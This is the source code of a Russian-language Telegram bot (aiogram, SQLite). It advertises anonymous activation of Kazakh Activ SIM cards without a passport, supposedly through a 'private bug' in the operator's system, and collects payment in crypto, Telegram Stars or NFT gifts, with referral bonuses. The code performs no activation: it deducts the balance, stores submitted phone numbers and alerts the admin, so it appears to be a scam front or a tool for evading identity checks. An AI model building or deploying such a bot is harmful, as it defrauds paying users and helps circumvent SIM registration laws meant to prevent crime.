import logging
import sqlite3
import random
import time
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import asyncio

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "ВАШ_ТОКЕН_ОТ_BOTFATHER"  # ВСТАВЬТЕ СВОЙ
ADMIN_ID = 123456789  # ВАШ TELEGRAM ID (узнайте у @userinfobot)
PRICE_USD = 3
PRICE_STARS = 180
WAIT_TIME = 15  # минут

# ========== ПОДКЛЮЧЕНИЕ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
logging.basicConfig(level=logging.INFO)

# ========== БАЗА ДАННЫХ (SQLite) ==========
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance REAL DEFAULT 0,
            activated INTEGER DEFAULT 0,
            ref_count INTEGER DEFAULT 0,
            ref_active INTEGER DEFAULT 0,
            ref_bonus TEXT DEFAULT '[]'
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            status TEXT DEFAULT 'waiting',
            created_at TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS texts (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    conn.commit()
    
    default_texts = {
        'start': 'Приветствуем вас в боте по автоматической активации SIM-карт Activ (Казахстан)! 🇰🇿\n\nЗдесь вы можете зарегистрировать свои номера без документов и паспортов через наш приватный алгоритм.\n\nНажмите нужную кнопку в меню ниже, чтобы начать работу!',
        'info': 'ℹ️ О нашем сервисе:\n\nМы предоставляем услуги по регистрации SIM-карт оператора Activ (Казахстан) через приватный баг в системе.\n\n🛑 Преимущества:\nПолная анонимность — паспорт и документы не требуются.\nВысокая скорость — активация занимает всего несколько минут.\n\n📈 Стоимость:\n1 номер — 3$',
        'support': '👨‍💻 Связь с администрацией\n\nУ вас возникли вопросы или проблемы с оплатой? Мы всегда на связи!\n\n📞 Наш контакт: @lolko_01\n\n⏱ Время ответа зависит от загруженности, но мы стараемся решать все вопросы максимально быстро!',
        'payment': '💵 Пополнение баланса бота\n\nВыберите удобный для вас способ оплаты:\n\n1️⃣ Crypto Bot (USDT, TON, BTC) 🤖\n🔗 Кошелёк: TQjT7n8QeW6kNQhLfJk2sP9vR3xU5yZ8V (USDT, сеть TON)\n\nПосле оплаты нажмите «Я оплатил» и отправьте скриншот чека.\n\n2️⃣ Telegram Stars ⭐️\nСтоимость: 180 Звёзд за 1 активацию.\n\n3️⃣ NFT Подарки 🎁\nОплата и передача NFT подарка обсуждается с владельцем.\nНапишите @lolko_01\n\nПосле оплаты напишите @lolko_01 для подтверждения.',
        'crypto': '🤖 Оплата через Crypto Bot\n\n🔗 Кошелёк: TQjT7n8QeW6kNQhLfJk2sP9vR3xU5yZ8V (USDT, сеть TON)\n\nПереведите сумму и нажмите «Я оплатил».',
        'stars': '⭐️ Оплата через Telegram Stars\n\nСтоимость: 180 Звёзд за 1 активацию.\n\nПосле оплаты нажмите «Я оплатил».',
        'nft': '🎁 Оплата через NFT Подарки\n\nОплата и передача NFT подарка обсуждается с владельцем.\n\nНапишите @lolko_01',
        'referral': '👥 Зарабатывайте бесплатные активации и скидки!\n\nПриглашайте друзей по своей уникальной ссылке и получайте бонусы:\n\n🔥 Пригласили 1 друга ➡️ купон на 25% скидку\n🔥 Пригласили 10 друзей ➡️ 2 бесплатные активации\n\n🔗 Ваша ссылка: https://t.me/lol_active_bot?start=ref_{user_id}\n\n📊 Статистика: 0 приглашений, 0 активаций\n\n🛡 Антифрод-система: регистрация своих аккаунтов по ссылке ведёт к блокировке.',
        'contest': '🎉 Розыгрыши и акции\n\nАктивных розыгрышей нет. Следите за обновлениями!',
        'step1': '🚀 Для активации SIM-карты пополните баланс на 3$.',
        'step2': '🚀 Отправьте номер телефона без +7 в формате 7071234567',
        'step3': 'Номер {phone} принят в обработку! Ожидайте в течение 15 минут.',
        'step4': 'На ваш номер {phone} отправлен код подтверждения. Введите 4-значный код:',
        'step5': '✅ Сим-карта успешно активирована!\nНомер {phone} готов к работе.',
        'refuse': '❌ Активация номера {phone} невозможна. Деньги возвращены на баланс.',
        'refund': '⚠️ Условия возврата:\nЕсли номер взят в работу — деньги не возвращаются.',
        'nobalance': '❌ Недостаточно средств!\nВаш баланс: {balance} $\nПополните на 3$.'
    }
    
    for key, value in default_texts.items():
        cursor.execute('INSERT OR IGNORE INTO texts (key, value) VALUES (?, ?)', (key, value))
    
    conn.commit()
    conn.close()

def get_text(key):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM texts WHERE key = ?', (key,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else 'Текст не найден'

def add_user(user_id, username):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, username))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result

def update_balance(user_id, amount):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()

def add_order(user_id, phone):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO orders (user_id, phone, status, created_at) VALUES (?, ?, ?, ?)',
                   (user_id, phone, 'waiting', datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_orders():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM orders WHERE status = "waiting"')
    result = cursor.fetchall()
    conn.close()
    return result

def update_order_status(order_id, status):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE orders SET status = ? WHERE id = ?', (status, order_id))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    result = cursor.fetchall()
    conn.close()
    return result

# ========== КЛАВИАТУРЫ ==========
def main_keyboard():
    buttons = [
        [InlineKeyboardButton(text="ℹ️ Информация", callback_data="info")],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")],
        [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="payment")],
        [InlineKeyboardButton(text="👥 Реферальная программа", callback_data="referral")],
        [InlineKeyboardButton(text="🎉 Розыгрыш", callback_data="contest")],
        [InlineKeyboardButton(text="📱 Активировать SIM", callback_data="activate")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def back_keyboard():
    buttons = [[InlineKeyboardButton(text="◀️ Назад", callback_data="main_menu")]]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_keyboard():
    buttons = [
        [InlineKeyboardButton(text="🤖 Crypto Bot", callback_data="pay_crypto")],
        [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="pay_stars")],
        [InlineKeyboardButton(text="🎁 NFT Подарки", callback_data="pay_nft")],
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="pay_confirm")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_keyboard():
    buttons = [
        [InlineKeyboardButton(text="📋 Заявки", callback_data="admin_orders")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="🎲 Розыгрыш", callback_data="admin_contest")],
        [InlineKeyboardButton(text="🔙 Выйти", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ========== КОМАНДЫ ==========
@dp.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    add_user(user_id, username)
    text = get_text('start')
    await message.answer(text, reply_markup=main_keyboard())

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещён!")
        return
    await message.answer("🔐 Админ-панель", reply_markup=admin_keyboard())

# ========== КОЛБЭКИ ==========
@dp.callback_query()
async def callback_handler(call: types.CallbackQuery):
    user_id = call.from_user.id
    data = call.data
    
    if data == "main_menu":
        await call.message.edit_text(get_text('start'), reply_markup=main_keyboard())
        await call.answer()
        return
    
    if data == "info":
        await call.message.edit_text(get_text('info'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "support":
        await call.message.edit_text(get_text('support'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "payment":
        await call.message.edit_text(get_text('payment'), reply_markup=payment_keyboard())
        await call.answer()
        return
    
    if data == "referral":
        text = get_text('referral').replace('{user_id}', str(user_id))
        await call.message.edit_text(text, reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "contest":
        await call.message.edit_text(get_text('contest'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "activate":
        user = get_user(user_id)
        if not user:
            await call.message.edit_text("❌ Ошибка! Нажмите /start", reply_markup=back_keyboard())
            await call.answer()
            return
        if user[2] < PRICE_USD:
            text = get_text('nobalance').replace('{balance}', str(user[2]))
            await call.message.edit_text(text, reply_markup=back_keyboard())
            await call.answer()
            return
        await call.message.edit_text(get_text('step2'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "pay_crypto":
        await call.message.edit_text(get_text('crypto'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "pay_stars":
        await call.message.edit_text(get_text('stars'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "pay_nft":
        await call.message.edit_text(get_text('nft'), reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "pay_confirm":
        await call.message.edit_text("✅ Спасибо за оплату!\n\nВаш платёж принят в обработку. Администратор проверит его и свяжется с вами.", reply_markup=back_keyboard())
        await bot.send_message(ADMIN_ID, f"💰 Пользователь @{call.from_user.username or 'Без username'} нажал «Я оплатил»")
        await call.answer()
        return

# ========== ОБРАБОТКА НОМЕРА ==========
@dp.message()
async def handle_number(message: types.Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    user = get_user(user_id)
    if not user:
        await message.answer("❌ Нажмите /start для регистрации")
        return
    
    if len(text) == 10 and text.isdigit():
        if user[2] < PRICE_USD:
            await message.answer(get_text('nobalance').replace('{balance}', str(user[2])))
            return
        update_balance(user_id, -PRICE_USD)
        add_order(user_id, text)
        await message.answer(get_text('step3').replace('{phone}', text))
        await bot.send_message(ADMIN_ID, f"📋 Новая заявка!\nПользователь: @{message.from_user.username}\nНомер: {text}")
    else:
        await message.answer("❌ Отправьте номер в формате 7071234567 (10 цифр без +7)")

# ========== АДМИН-ОБРАБОТЧИКИ ==========
@dp.callback_query(lambda call: call.data.startswith("admin_"))
async def admin_callback(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.answer("❌ Доступ запрещён!")
        return
    
    data = call.data
    
    if data == "admin_orders":
        orders = get_orders()
        if not orders:
            await call.message.edit_text("📋 Активных заявок нет.", reply_markup=admin_keyboard())
            await call.answer()
            return
        text = "📋 Активные заявки:\n\n"
        for order in orders:
            order_id = order[0]
            user_id = order[1]
            phone = order[2]
            user = get_user(user_id)
            username = user[1] if user else "Неизвестно"
            text += f"{order_id}. @{username} — {phone}\n"
        await call.message.edit_text(text, reply_markup=admin_keyboard())
        await call.answer()
        return
    
    if data == "admin_stats":
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM orders WHERE status = "waiting"')
        active_orders = cursor.fetchone()[0]
        cursor.execute('SELECT SUM(balance) FROM users')
        total_balance = cursor.fetchone()[0] or 0
        cursor.execute('SELECT COUNT(*) FROM users WHERE activated > 0')
        activated = cursor.fetchone()[0]
        conn.close()
        text = f"📊 Статистика:\n\n👥 Пользователей: {total_users}\n🔄 Активных заявок: {active_orders}\n💰 Общий баланс: {total_balance:.2f} $\n✅ Активировано SIM: {activated}"
        await call.message.edit_text(text, reply_markup=admin_keyboard())
        await call.answer()
        return
    
    if data == "admin_broadcast":
        await call.message.edit_text("📢 Введите текст для рассылки (всем пользователям):", reply_markup=back_keyboard())
        await call.answer()
        return
    
    if data == "admin_contest":
        users = get_all_users()
        if not users:
            await call.message.edit_text("❌ Нет пользователей для розыгрыша.", reply_markup=admin_keyboard())
            await call.answer()
            return
        winner = random.choice(users)
        await bot.send_message(winner[0], "🎉 ПОЗДРАВЛЯЕМ! Вы выиграли бесплатную активацию SIM-карты Activ!\n\nНапишите администратору @lolko_01")
        await call.message.edit_text(f"✅ Победитель выбран! ID: {winner[0]}", reply_markup=admin_keyboard())
        await call.answer()
        return

# ========== ЗАПУСК ==========
async def main():
    init_db()
    logging.info("✅ Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
